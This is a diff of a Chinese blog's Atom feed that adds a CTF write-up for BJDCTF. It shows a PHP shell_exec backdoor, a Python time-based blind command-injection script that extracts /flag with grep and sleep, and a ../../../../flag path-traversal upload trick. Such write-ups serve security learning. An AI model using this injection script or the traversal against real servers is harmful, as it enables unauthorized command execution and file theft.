@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>小张的博客</title>
-    <updated>2020-05-27T02:57:21.052Z</updated>
+    <updated>2020-05-27T12:34:01.838Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,72 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 小张的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[第三届BJDCTF菜鸡签到记—持续更新wp]]></title>
+        <id>https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/</id>
+        <link href="https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/">
+        </link>
+        <updated>2020-05-27T11:43:26.000Z</updated>
+        <content type="html"><![CDATA[<p>比赛打的细碎，还好赛后出题人说不是针对新手的，要不然我直接自闭:-(<br>
+直接wp吧，希望第四届排名能够冲击前100</p>
+<h1 id="web">web</h1>
+<h2 id="帮帮小红花">帮帮小红花</h2>
+<p>赛后复现了一波<br>
+这个题目是web里面分数最低的了，但是这个题目很苟<br>
+打开题目就是花里胡哨的页面，总之题目告诉我们php后端就一句话</p>
+<?php shell_exec($_GET['imagin']); ?>
+<p>emm 它只有后门，没有回显的地方，常规思路直接弹个shell玩玩<br>
+我Google了一些发现可以利用服务器解析日志dnslog来达到类似的shell效果<br>
+有一个提供类似服务的网站，还可以一键生成payload（脚本小子狂喜）<br>
+我们直接用dnslog打发现行不通，应该是后端开启了防火墙限制流量之类的（瞎猜的，不过有防火墙是肯定的）或者是服务器没有连接网络<br>
+那么应该是bash盲注了，但是我比赛的时候没有注入出来，后来发现脚本中的路径写错了草-.-||<br>
+题目中提示我们flag在根目录下，我直接简单的改了改之前sql盲注的脚本，一把梭出来就行了</p>
+<pre><code class="language-python">import requests
+import time
+
+url = &quot;http://127.0.0.1/flag.php?imagin=&quot;
+flag = &quot;BJD{&quot;
+flag_list = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789{}&quot;
+
+while True :
+    num = 0
+    for i in flag_list :
+        num = num + 1
+        payload = 'grep -e &quot;{}&quot; /flag %26%26 sleep 2'.format(flag + i)
+        #%26是&amp;的url编码，这种特殊字符要经过url编码，要不然打不出来-.-|
+        start_time = time.time()  #设置发送请求之前的时间
+        r = requests.get(url + payload)
+        end_time = time.time()  #设置发送请求之后的时间
+        if end_time - start_time &gt; 0.5 :
+            flag = flag + i
+            print(flag)
+            break
+    if num &gt; 63:
+        #此时已经遍历列表，说明flag已经到达结尾
+        break
+</code></pre>
+<p>打一下，就能拿到flag了<br>
+<img src="https://zhangzy999.github.io//post-images/1590580947041.PNG" alt="" loading="lazy"></p>
+<h2 id="gob">gob</h2>
+<p>表面是文件上传，其实是目录穿越<br>
+有一个注册功能但是没有卵用，直接注册（或者不注册）到文件上传页面<br>
+尝试上传各种php，都被解析成了文本，各种图片马 .htaccess .user.ini都没用<br>
+雪殇大佬提示目录穿越在bp中改包<br>
+我们打开bp 然后抓包改文件名 改成../../../../flag   然后后面的base64编码的东西解码过了就是flag，感觉比第一题简单，有点儿脑洞的感觉</p>
+<h1 id="misc">misc</h1>
+<h2 id="questionnaire">questionnaire</h2>
+<p>调查问卷，应该是考社工<br>
+Google + 百度识图 基本能出来所有的答案<br>
+还有一个鸭子的不好出，听师傅们说用百度地图可以找到，还把街道名字给列出来了（tql<br>
+其实这题直接f12就出了草<br>
+划水签到题<br>
+由于第一次玩这种题  感觉还挺有意思的  特地保留了一张图片<br>
+<img src="https://zhangzy999.github.io//post-images/1590582813536.png" alt="" loading="lazy"></p>
+<h2 id="bincat">/bin/cat</h2>
+<p>拿到gif  逐帧提取  然后分离下色道 能看出来是二维码<br>
+不会写脚本 直接截图工具手撸  扫描得二维码</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[解决的第一个pwn题目—攻防世界新手区：when_did_you_born]]></title>
         <id>https://zhangzy999.github.io/post/pwn_adworld_birth/</id>
